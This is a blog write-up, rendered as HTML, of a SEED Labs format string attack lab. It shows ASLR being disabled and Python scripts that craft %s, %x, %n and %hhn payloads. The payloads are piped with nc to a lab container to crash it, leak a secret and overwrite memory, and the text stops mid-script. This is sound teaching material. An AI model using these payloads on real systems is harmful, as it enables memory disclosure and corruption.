@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		
+<title>Format String Attack Lab-无限进步</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/shengdanwu.png">
+
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+<meta name="keywords" content="Expoilt,ret2libc,">
+<meta name="description" content="实验过程">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/index.js"></script>
+
+
+<script src="/js/fancybox.umd.js"></script>
+
+
+<script src="/js/fancybox-images.js"></script>
+
+
+<script src="/js/gitalk.min.js"></script>
+
+
+<script src="/js/hljs.min.js"></script>
+ 
+<script>hljs.highlightAll();</script>
+
+	<meta name="generator" content="Hexo 8.1.1"></head>
+
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/shengdanwu.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Ram</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">HOME</a>
+        </li>
+        
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
+        
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
+        
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
+        
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/RamBree">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'>
+</div>
+<style>
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
+        right: 0;
+        bottom: 0;
+        z-index: 1998;
+    }
+    .sidebar {
+        width: 66%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					right: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					right: "-100%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('/image/demon-slayer-3840x2160-10716.jpg')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/Expoilt">Expoilt</a></li>
+            
+            <li><a href="/tags/ret2libc">ret2libc</a></li>
+            
+            
+        </ul>
+        
+        <h1>Format String Attack Lab</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Ram</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                         <a href="../../categories/SeedLabs2-0/" target="_blank" >SeedLabs2.0</a>
+                    
+                </div>
+                <p>2025-11-06 16:04:22</p>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
+    
+      <div id="post-toc">
+        <span class="post-toc-title">文章目录</span>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-Attack-Lab"><span class="toc-text">Format String Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Crashing-the-Program"><span class="toc-text">Task 1: Crashing the Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Printing-Out-the-Server-Program%E2%80%99s-Memory"><span class="toc-text">Task 2: Printing Out the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1A%EF%BC%9A%E6%A0%88%E6%95%B0%E6%8D%AE"><span class="toc-text">任务A：栈数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1B%EF%BC%9A%E5%A0%86%E6%95%B0%E6%8D%AE"><span class="toc-text">任务B：堆数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Modifying-the-Server-Program%E2%80%99s-Memory"><span class="toc-text">Task 3: Modifying the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1A%EF%BC%9A%E5%B0%86%E5%80%BC%E6%94%B9%E4%B8%BA%E4%B8%8D%E5%90%8C%E7%9A%84%E5%80%BC"><span class="toc-text">任务A：将值改为不同的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1B%EF%BC%9A%E5%B0%86%E5%80%BC%E6%94%B9%E4%B8%BA0x5000"><span class="toc-text">任务B：将值改为0x5000</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1C%EF%BC%9A%E5%B0%86%E5%80%BC%E6%94%B9%E4%B8%BA0xAABBCCDD"><span class="toc-text">任务C：将值改为0xAABBCCDD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Inject-Malicious-Code-into-the-Server-Program"><span class="toc-text">Task 4: Inject Malicious Code into the Server Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Attacking-the-64-bit-Server-Program"><span class="toc-text">Task 5: Attacking the 64-bit Server Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Fixing-the-Problem"><span class="toc-text">Task 6: Fixing the Problem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <h1 id="Format-String-Attack-Lab"><a href="#Format-String-Attack-Lab" class="headerlink" title="Format String Attack Lab"></a>Format String Attack Lab</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>关闭安全策略。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">kernel.randomize_va_space</span><span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>根据课上要求，把server_code中的<code>Makefile</code>中的L改成115。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251105101308330.png" alt="image-20251105101308330"></p>
+<p>编译程序</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span>
+<span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在编译过程中，你将看到一个警告消息。这个警告是由 gcc 编译器针对格式化字符串漏洞实现的防范措施。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251105101659220.png" alt="image-20251105101659220"></p>
+<p>启动docker容器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dcbuild	<span class="token comment"># docker-compose build 的别名</span>
+dcup	<span class="token comment"># docker-compose build 的别名</span>
+dcdown	<span class="token comment"># docker-compose down 的别名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251105102129954.png" alt="image-20251105102129954"></p>
+<h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>向<code>10.9.0.5</code>服务器发送信息，看到目标容器打印的信息。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251105102928912.png" alt="image-20251105102928912"></p>
+<blockquote>
+<p>每次启动docker的时候，地址都会不一样，根据实际情况来完成实验。</p>
+</blockquote>
+<p>如果 myprintf() 返回，它会 打印出”Returned properly” 和笑脸。如果你看不到，format 程序可能已经崩溃了。</p>
+<p>我们构造payload如下，只需要将输入多个<code>%s</code>就可以导致程序崩溃。这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+<span class="token comment"># Initialize the content array</span>
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number  <span class="token operator">=</span> <span class="token number">0xbfffeeee</span>
+
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">"%s"</span><span class="token operator">*</span><span class="token number">30</span> <span class="token operator">+</span> <span class="token string">"%n"</span>
+fmt  <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token comment"># Write the content to badfile</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>向服务器输入文件。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> badfile <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.9</span>.0.5 <span class="token number">9090</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以看见程序崩溃了</p>
+<p><img src="/2025/11/06/seedlab3/image-20251105104738094.png" alt="image-20251105104738094"></p>
+<h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><h3 id="任务A：栈数据"><a href="#任务A：栈数据" class="headerlink" title="任务A：栈数据"></a>任务A：栈数据</h3><p>首先输入一个32位的地址，然后我们输入80个<code>%x</code>并用<code>.</code>进行标识分隔。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number  <span class="token operator">=</span> <span class="token number">0xbfffeeee</span>
+
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">"%x."</span><span class="token operator">*</span><span class="token number">80</span>
+fmt  <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到打印出了我们输入的数据，发现是是倒数第十三个。那我们就可以直接定位到是第68个，只需要将s修改为<code>%68$x</code>。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106133737995.png" alt="image-20251106133737995"></p>
+<p>定位到了一个输入的位置。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106134333734.png" alt="image-20251106134333734"></p>
+<h3 id="任务B：堆数据"><a href="#任务B：堆数据" class="headerlink" title="任务B：堆数据"></a>任务B：堆数据</h3><p>有了上面的基础就很简单了。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number  <span class="token operator">=</span> <span class="token number">0x080b4008</span> <span class="token comment"># secret的地址</span>
+
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">'%68$s'</span>
+fmt  <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>secret被打印了出来。</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106135436319.png" alt="image-20251106135436319"></p>
+<h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><h3 id="任务A：将值改为不同的值"><a href="#任务A：将值改为不同的值" class="headerlink" title="任务A：将值改为不同的值"></a>任务A：将值改为不同的值</h3><p>利用<code>%n</code>将值写入</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number  <span class="token operator">=</span> <span class="token number">0x080e5068</span> <span class="token comment"># target的地址</span>
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">'%68$n'</span>
+fmt  <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106140142606.png" alt="image-20251106140142606"></p>
+<h3 id="任务B：将值改为0x5000"><a href="#任务B：将值改为0x5000" class="headerlink" title="任务B：将值改为0x5000"></a>任务B：将值改为0x5000</h3><p>因为只需要改为0x5000，我们采用%n写入，地址空间占用。<code>0x5000</code> 为20480 个字符。</p>
+<p>需要填充的字符数 &#x3D; 20480 - 4 &#x3D; 20476</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number  <span class="token operator">=</span> <span class="token number">0x080e5068</span> <span class="token comment"># target的地址</span>
+
+content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token string">'%20476c%68$n'</span>
+fmt  <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2025/11/06/seedlab3/image-20251106141918765.png" alt="image-20251106141918765"></p>
+<h3 id="任务C：将值改为0xAABBCCDD"><a href="#任务C：将值改为0xAABBCCDD" class="headerlink" title="任务C：将值改为0xAABBCCDD"></a>任务C：将值改为0xAABBCCDD</h3><p>同理</p>
+<p><img src="/2025/11/06/seedlab3/image-20251106142115379.png" alt="image-20251106142115379"></p>
+<p>0xAABBCCDD &#x3D; 2864434397</p>
+<p>需要填充的字符数 &#x3D; 2864434397 - 4 &#x3D; 2864434393</p>
+<p>但这样子会产生堵塞，我们采用单字节<code>%hhn</code>单字节输入。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+<span class="token keyword">import</span> sys
+
+N <span class="token operator">=</span> <span class="token number">1500</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span>
+number <span class="token operator">=</span> <span class="token number">0x080e5068</span>  <span class="token comment"># target地址</span>
+
+<span class="token comment"># 0xaabbccdd 分解为4个字节：</span>
+<span class="token comment"># 0xdd (221), 0xcc (204), 0xbb (187), 0xaa (170)</span>
+
+<span class="token comment"># 布置4个连续地址</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>number <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 按从高到低的顺序写入</span>
+s <span class="token operator">=</span> <span class="token string">''</span>
+current_count <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 前16字节是4个地址</span>
+
+<span class="token comment"># 写入 0xaa (170) 到 number+3</span>
+pad <span class="token operator">=</span> <span class="token number">170</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%71$hhn'</span></span>
+current_count <span class="token operator">=</span> <span class="token number">170</span>
+<span class="token comment"># 写入 0xbb (187) 到 number+2  </span>
+pad <span class="token operator">=</span> <span class="token number">187</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%70$hhn'</span></span>
+current_count <span class="token operator">=</span> <span class="token number">187</span>
+<span class="token comment"># 写入 0xcc (204) 到 number+1</span>
+pad <span class="token operator">=</span> <span class="token number">204</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%69$hhn'</span></span>
+current_count <span class="token operator">=</span> <span class="token number">204</span>
+<span class="token comment"># 写入 0xdd (221) 到 number</span>
+pad <span class="token operator">=</span> <span class="token number">221</span> <span class="token operator">-</span> current_count
+s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pad<span class="token punctuation">&#125;</span></span><span class="token string">c%68$hhn'</span></span>
+current_count <span class="token operator">=</span> <span class="token number">221</span>
+
+fmt <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fmt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'badfile'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
